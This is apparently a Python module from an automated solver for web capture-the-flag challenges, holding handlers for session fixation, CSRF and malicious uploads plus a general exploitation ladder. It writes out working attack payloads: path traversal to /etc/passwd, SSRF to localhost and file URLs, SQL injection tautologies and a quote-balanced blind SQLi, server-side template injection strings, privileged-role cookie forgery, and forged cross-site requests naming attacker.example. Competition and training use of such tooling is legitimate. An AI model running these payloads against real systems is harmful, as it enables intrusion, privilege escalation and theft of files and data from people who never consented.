"""Per-vuln-class handlers for the generic web solver, plus the `default` general ladder (R1).

`for_key(key, clues)` returns the built-in handlers whose vuln class the clue KEY names (never the value -- the
documented pitfall). The caller (lib.web.candidates) always also races `default` and every earlier web day's
answer(), so coverage never depends on a key being recognised. Each handler takes (base_url, clues_dict) and returns
a proof_<hex> string or None. Hardened off-peak by hctf web-harden against free earlier-day Time Trial targets.
"""
import json
import re
import secrets
import urllib.parse

from lib import websolve

SID_PARAMS = ("sid", "session_id", "session", "sessionid", "token", "PHPSESSID")

# clue KEY (regex) -> built-in handler name. The value in the clue is NEVER matched; only the key.
_KEY_MAP = [
    (r"sess|sid", "session_fixation"),
    # D22 "Uploading Expectations": {feature_route, render_route, preview_guide, upload_policy, upload_shape}
    (r"upload", "upload"),
    # D22 "Forged With Care": {current_user, feature_route, preferences_route, browser_session}
    (r"preferences|csrf|xsrf|browser_session", "csrf"),
]


def for_key(key, clues):
    """Ordered (name, fn) built-in handlers whose class the clue keys name: the dispatch key first, then every other
    clue KEY (D22: the dispatch key was `current_user` / `preview_guide`, the class lived in a sibling key)."""
    out = []
    keys = [key or ""] + [k for k in (clues if isinstance(clues, dict) else {}) if k != key]
    for k in keys:
        for pat, name in _KEY_MAP:
            if re.search(pat, k, re.I) and name in _HANDLERS and (name, _HANDLERS[name]) not in out:
                out.append((name, _HANDLERS[name]))
    return out


def _routes(clues, base):
    """Every path the kit names in /api/clues, plus links scraped from the home page as a fallback."""
    j = clues if isinstance(clues, dict) else {}
    routes = [v for v in j.values() if isinstance(v, str) and re.fullmatch(r"/[\w./-]+", v)]
    for v in j.values():
        if isinstance(v, list):
            routes += [x for x in v if isinstance(x, str) and x.startswith("/")]
    if not routes:
        _, home, _ = websolve.fetch(base)
        routes = [r for r in re.findall(r'href="(/[^"#?]+)"', home)
                  if not r.startswith(("/assets", "/api/clues"))]
    return list(dict.fromkeys(routes))


def session_fixation(base, clues):
    """Session fixation (lifted from the Day-21 session-impression solver): plant the hinted session id (or our own)
    via the planting route, then present it as the cookie on every protected route until the privileged session leaks
    the proof."""
    j = clues if isinstance(clues, dict) else {}
    routes = _routes(j, base)
    hint = next((v for k, v in j.items() if isinstance(v, str) and re.search(r"sess|sid|token", k, re.I)), None) \
        or secrets.token_hex(6)
    cookies, planted = [], set()
    for r in routes:
        url = urllib.parse.urljoin(base, r)
        _, body, _ = websolve.fetch(url)
        p = websolve.proof(body)
        if p:
            return p
        if not re.search(r"session|sid", body, re.I) or re.search(r"login|authenticat", body, re.I):
            continue
        for name in SID_PARAMS:
            _, body, sc = websolve.fetch(url + "?" + urllib.parse.urlencode({name: hint}))
            p = websolve.proof(body)
            if p:
                return p
            if "required" not in body:
                cookies += [c.split(";", 1)[0] for c in sc]
                planted.add(r)
                break
    cands = [c for c in cookies if c.split("=", 1)[-1] == hint] or cookies \
        or [f"{n}={hint}" for n in ("arena_session", "PHPSESSID", "session", "sid", "laravel_session")]
    for r in sorted(routes, key=lambda r: r in planted):   # protected (non-planting) routes first
        url = urllib.parse.urljoin(base, r)
        for c in cands:
            _, body, _ = websolve.fetch(url, {"Cookie": c})
            p = websolve.proof(body)
            if p:
                return p
    return None


_PARAM_PAYLOADS = {
    "id": ["1", "0", "2", "admin"],
    "user": ["admin", "0", "1"], "user_id": ["1", "0", "2"], "uid": ["1", "0"],
    # LFI: a PHP viewer silently returns the NORMAL page for shallow traversal, so go deep (>= 3 `../`) and
    # target the absolute path the prompt names on this event -- measured /run/huntress/objective.txt. `doc`
    # is the viewer's param name on this lane's LFI family and was missing from the ladder.
    "file": ["../../../../etc/passwd", "../../../../../run/huntress/objective.txt", "../app.py", "index.html"],
    "path": ["../../../../etc/passwd", "../../../../../run/huntress/objective.txt", "../app.py"],
    "page": ["../../../../etc/passwd", "../../../../../run/huntress/objective.txt"],
    "doc": ["../../../../../run/huntress/objective.txt", "../../../../etc/passwd"],
    "url": ["http://127.0.0.1/", "http://localhost/", "file:///etc/passwd"],
    # Blind SQLi: the search interpolates `q` into an EVEN number of `col LIKE '%q%'` clauses, so the classic
    # tautology pair (`' OR '1'='1` / `'...'='2`) is NOT an oracle -- both return all rows. A QUOTE-BALANCED
    # payload (`nope' OR (<cond>) OR '1'='2`) makes every literal clause false and reduces the WHERE to <cond>,
    # surfacing the hidden proof row directly (the proof sits in a `summary`-like column).
    "q": ["' OR '1'='1", "') OR ('1'='1", "1 OR 1=1",
          "nope' OR (summary LIKE 'proof%') OR '1'='2", "nope' OR 1=1 OR '1'='2"],
    "search": ["' OR '1'='1", "nope' OR (summary LIKE 'proof%') OR '1'='2"],
    "name": ["' OR '1'='1", "nope' OR (summary LIKE 'proof%') OR '1'='2"], "q2": ["' OR '1'='1"],
}
_PRIV_ROLES = ("admin", "administrator", "moderator", "root", "superuser")


def default(base, clues):
    """R1: general exploitation ladder for an unknown / unmatched clue key, driven ONLY by the invariant kit shape
    (named routes + current_role). Never fails to TRY -- it is the no-fail path for a never-seen class.
    Ladder: (1) GET every named route as-is; (2) role escalation (present privileged role cookies/headers);
    (3) parameter tampering (IDOR / LFI / SSRF / SQLi) on the named routes. First proof_<hex> wins."""
    j = clues if isinstance(clues, dict) else {}
    routes = _routes(j, base)

    # 1) every named route as the current role
    for r in routes:
        p = websolve.proof(websolve.fetch(urllib.parse.urljoin(base, r))[1])
        if p:
            return p

    # 2) role escalation: common ways the kit carries a role
    for role in _PRIV_ROLES:
        for hdrs in ({"Cookie": f"role={role}"}, {"Cookie": f"current_role={role}"},
                     {"X-Role": role}, {"Cookie": f"user={role}"}):
            for r in routes:
                p = websolve.proof(websolve.fetch(urllib.parse.urljoin(base, r), hdrs)[1])
                if p:
                    return p

    # 3) parameter tampering on each named route (IDOR / LFI / SSRF / SQLi)
    for r in routes:
        url = urllib.parse.urljoin(base, r)
        for param, vals in _PARAM_PAYLOADS.items():
            for v in vals:
                q = urllib.parse.urlencode({param: v})
                p = websolve.proof(websolve.fetch(f"{url}{'&' if '?' in url else '?'}{q}")[1])
                if p:
                    return p
    return None


_XSITE = {"Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Dest": "document",
          "Sec-Fetch-User": "?1", "Referer": "https://attacker.example/forged.html"}
_ATTR = r"""\b{}\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))"""


def _attr(tag, name):
    m = re.search(_ATTR.format(name), tag, re.I)
    return next((g for g in m.groups() if g is not None), "") if m else None


class _Session:
    """Tiny cookie jar over websolve.fetch (keeps the victim's arena_session across the recon and the forged hit)."""

    def __init__(self, base):
        self.base, self.jar = base, {}

    def get(self, path, headers=None, data=None, method=None):
        h = dict(headers or {})
        if self.jar:
            h["Cookie"] = "; ".join(f"{k}={v}" for k, v in self.jar.items())
        st, body, sc = websolve.fetch(urllib.parse.urljoin(self.base, path), h, data=data, method=method)
        for c in sc:
            k, _, v = c.split(";", 1)[0].partition("=")
            if k.strip():
                self.jar.setdefault(k.strip(), v.strip())
        return st, body


def _forms(html):
    """[(method, action, fields{name: value}, choices{name: [option values]})] for every <form> in the page."""
    out = []
    for m in re.finditer(r"<form\b([^>]*)>(.*?)</form>", html, re.I | re.S):
        tag, inner = m.groups()
        fields, choices = {}, {}
        for s in re.finditer(r"<select\b([^>]*)>(.*?)</select>", inner, re.I | re.S):
            name = _attr(s.group(1), "name")
            if name:
                opts = [_attr(o, "value") for o in re.findall(r"<option\b[^>]*>", s.group(2), re.I)]
                choices[name] = [o for o in opts if o is not None]
        for i in re.findall(r"<(?:input|textarea|button)\b[^>]*>", inner, re.I):
            name = _attr(i, "name")
            if name and (_attr(i, "type") or "").lower() not in ("submit", "button", "reset"):
                fields[name] = _attr(i, "value") or ""
        out.append(((_attr(tag, "method") or "get").lower(), _attr(tag, "action") or "", fields, choices))
    return out


def _state_routes(html, clues):
    """Where the app shows the saved state: /api/* links on the form page, then /api/* values in the clues."""
    links = re.findall(r"""href\s*=\s*["'](/api/[^"'#]+)["']""", html, re.I)
    links += [v for v in clues.values() if isinstance(v, str) and v.startswith("/api/") and v != "/api/clues"]
    return list(dict.fromkeys(links))


def csrf(base, clues):
    """CSRF (lifted from the Day-22 forged-with-care solver; GM-confirmed single, TT and Mastery): the clue-named
    page holds a state-changing <form> (select of the current value + a foreign one, optional hidden csrf_token =
    session). Submitting it same-site records `changed_across_sites:false`; the SAME request sent as a cross-site
    navigation (Sec-Fetch-Site cross-site, foreign Referer/Origin) makes the state route (/api/*) return the proof.
    Tries the form with the token, without it, and with the method swapped; ~5 requests."""
    s = _Session(base)
    clues = clues if isinstance(clues, dict) else {}
    action_route = clues.get("feature_route")
    pages = [v for k, v in clues.items() if isinstance(v, str) and re.fullmatch(r"/[\w./-]*", v)
             and v != action_route and not v.startswith("/api/")]
    for page in pages + ([action_route] if action_route else []):
        st, html = s.get(page)
        p = websolve.proof(html)
        if p:
            return p
        for method, action, fields, choices in _forms(html):
            if not choices and not fields:
                continue
            action = action or page
            cur = re.search(r"(?:current|saved)[^<]*:\s*(?:<[^>]+>\s*)*([^<\s][^<]*)", html, re.I)
            cur = cur.group(1).strip() if cur else None
            # the change the victim never asked for: a non-current option, the external/foreign one first
            alts = {name: sorted(opts, key=lambda o: (o == cur, not re.search(
                r"@|extern|outside|attacker|admin|review", o, re.I))) for name, opts in choices.items()}
            n = max((len(v) for v in alts.values()), default=1)
            hidden = [k for k in fields if re.search(r"csrf|token|nonce|xsrf", k, re.I)]
            for i in range(n):
                base_form = dict(fields)
                for name, cand in alts.items():
                    base_form[name] = cand[min(i, len(cand) - 1)]
                no_tok = {k: v for k, v in base_form.items() if k not in hidden}
                for form, meth in ((base_form, method), (no_tok, method),
                                   (base_form, "post" if method == "get" else "get")):
                    if meth == "post":
                        st, body = s.get(action, dict(_XSITE, Origin="https://attacker.example"), data=form,
                                         method="POST")
                    else:
                        q = urllib.parse.urlencode(form)
                        st, body = s.get(f"{action}{'&' if '?' in action else '?'}{q}", _XSITE)
                    p = websolve.proof(body)
                    if p:
                        return p
                    if not 200 <= st < 300:
                        continue
                    for r in _state_routes(html, clues):
                        p = websolve.proof(s.get(r)[1])
                        if p:
                            return p
    return None


# (filename, content_type) ladder: the "bouncer" only polices one of the two in every variant seen so far.
_UPLOADS = [("note.html", "text/html"), ("note.html", "text/plain"), ("note.txt.html", "text/plain"),
            ("note.htm", "text/html"), ("note.html.txt", "text/html"), ("note.svg", "image/svg+xml")]


def _clue_route(cl, *pats):
    for p in pats:
        for k, v in cl.items():
            if re.search(p, k, re.I) and isinstance(v, str) and v.startswith("/"):
                return v
    return None


def _template(base, cl, read_guide=True):
    """Template expression for the objective field, spelled from the preview guide (`{{author}}` -> `{{objective}}`);
    falls back to the common engines' syntaxes. read_guide=False: defaults only (saves a round trip)."""
    field, toks = "objective", []
    guide = _clue_route(cl, r"guide|doc|help") if read_guide else None
    if guide:
        g = websolve.fetch(urllib.parse.urljoin(base, guide))[1]
        m = re.search(r"objective[^<]{0,40}<code>\s*([\w.]+)\s*</code>", g, re.I)
        field = m.group(1) if m else field
        for ex in re.findall(r"<code>([^<]*?)</code>", g):
            m = re.fullmatch(r"(.*?)\b([A-Za-z_]\w*)\b(.*)", ex.strip(), re.S)
            if m and (m.group(1) or m.group(3)):
                toks.append(m.group(1) + field + m.group(3))
    toks += ["{{" + field + "}}", "${" + field + "}", "<%= " + field + " %>", "{" + field + "}"]
    return " ".join("<p>%s</p>" % t for t in dict.fromkeys(toks))


def _upload_try(base, post, render, shape, content, ladder):
    for fn, ct in ladder:
        fields = {"filename": fn, "content": content, "content_type": ct}
        if re.search(r"json", shape, re.I) or not shape:
            st, body, _ = websolve.fetch(urllib.parse.urljoin(base, post), {"Content-Type": "application/json"},
                                         data=json.dumps(fields).encode(), method="POST")
        else:
            st, body, _ = websolve.fetch(urllib.parse.urljoin(base, post), data=fields, method="POST")
        p = websolve.proof(body)
        if p:
            return p
        try:
            j = json.loads(body)
        except ValueError:
            j = {}
        links = [v for v in (j.values() if isinstance(j, dict) else [])
                 if isinstance(v, str) and v.startswith(("/", "http"))]
        if not links and render and 200 <= st < 300:
            links = [f"{render}?{urllib.parse.urlencode({'file': fn})}"]
        for link in links:
            p = websolve.proof(websolve.fetch(urllib.parse.urljoin(base, link))[1])
            if p:
                return p
    return None


def upload(base, clues):
    """Unrestricted upload -> server-side template preview (lifted from the Day-22 uploading-expectations solver;
    GM-confirmed single, TT and Mastery): POST {filename, content, content_type} (JSON per `upload_shape`) of an HTML
    note carrying the guide's template field to feature_route, then open the preview path the server returns
    (render_route?file=<name>). The txt/text-plain policy was never enforced; the ladder covers a bouncer that is."""
    cl = clues if isinstance(clues, dict) else {}
    post = _clue_route(cl, r"feature|upload_route|submit|action")
    render = _clue_route(cl, r"render|preview_route|view|serve")
    if not post:
        return None
    shape = str(cl.get("upload_shape", ""))
    return _upload_try(base, post, render, shape, _template(base, cl, read_guide=False), _UPLOADS[:1]) \
        or _upload_try(base, post, render, shape, _template(base, cl), _UPLOADS)


_HANDLERS = {
    "session_fixation": session_fixation,
    "upload": upload,
    "csrf": csrf,
}


def _load_plugins():
    """Per-class plugin modules next to this file (`lib/web/handlers/<slug>.py`), each with KEY_MAP = [(clue-key regex,
    name)] and HANDLERS = {name: fn(base, clues) -> proof or None}. The web codify worker writes one IN-RUN the moment
    a new class is cracked (D22 post-mortem #8/#9): this run's Mastery -- whose 3 targets put today's class on ANY slot --
    and every later day's compounded targets pick it up at import, with no adoption step and no lost update between two
    web chains editing this file at once. A broken plugin is skipped, never fatal. The ratchet may fold it in here."""
    import importlib
    import sys
    from pathlib import Path
    for p in sorted(Path(__file__).parent.glob("*.py")):
        if p.name.startswith("_"):
            continue
        try:
            mod = importlib.import_module(f"{__name__}.{p.stem}")
            hs = dict(getattr(mod, "HANDLERS", None) or {})
            for pat, name in list(getattr(mod, "KEY_MAP", None) or []):
                # a built-in keeps its name; the same plugin may map several clue-key patterns to one handler
                if name in hs and callable(hs[name]) and _HANDLERS.get(name, hs[name]) is hs[name]:
                    re.compile(pat)
                    _HANDLERS[name] = hs[name]
                    if (pat, name) not in _KEY_MAP:
                        _KEY_MAP.append((pat, name))
        except Exception as e:  # noqa: BLE001 - one bad plugin must not sink the dispatch
            print(f"web handler plugin {p.name}: {e!r}", file=sys.stderr)


_load_plugins()
